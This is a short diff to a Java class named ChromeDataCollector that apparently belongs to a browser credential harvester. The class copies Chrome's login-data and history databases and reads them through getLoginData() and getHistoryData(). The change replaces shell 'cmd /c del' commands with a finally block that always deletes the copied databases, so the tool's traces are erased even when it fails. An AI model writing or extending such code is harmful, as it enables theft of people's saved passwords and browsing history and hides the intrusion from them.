@@ -21,13 +21,15 @@ class ChromeDataCollector {
             copyFiles(new File(ChromeInstallation.getHistoryPath()), historyDatabase);
             getLoginData();
             getHistoryData();
-
-            Runtime.getRuntime().exec("cmd /c del "+loginDataDatabase.getAbsolutePath());
-            Runtime.getRuntime().exec("cmd /c del "+historyDatabase.getAbsolutePath());
     
         } catch (Exception e) {
             System.out.println("[*] Exception occurred: " + e + "\n[*] Terminating");
             System.exit(0);
+        }finally{
+            File loginDataDatabase = new File("loginData.db");
+            File historyDatabase = new File("history.db");
+            loginDataDatabase.delete();
+            historyDatabase.delete();
         }
     }
 
